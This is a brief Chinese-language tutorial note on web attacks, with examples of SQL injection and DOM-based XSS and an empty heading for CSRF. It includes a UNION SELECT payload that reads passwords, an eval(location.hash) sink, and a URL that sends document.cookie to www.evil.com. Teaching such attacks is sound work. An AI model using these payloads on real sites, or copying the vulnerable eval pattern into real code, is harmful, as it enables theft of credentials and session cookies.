### Sql注入攻击
````javascript
http://www.foo.com/user.php?id=1
get请求目地：
  select username,email,desc1 from users where id=1;

攻击：
  http://www.foo.com/user.php?id=1 union select password,1,1 from users;
````
### XSS跨站脚本攻击
````javascript
前端解析location参数
<script>
eval( location.hash.substr(1) ); // 获取#符号后面的内容
</script>

攻击：
  http://www.foo.com/info.html#new%20Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie);

诱骗用户点击之后，用户所在的网站解析参数
然后加载图片，发起get请求"http://www.evil.com/steal.php?c="+escape(document.cookie)
````
### CSRF攻击
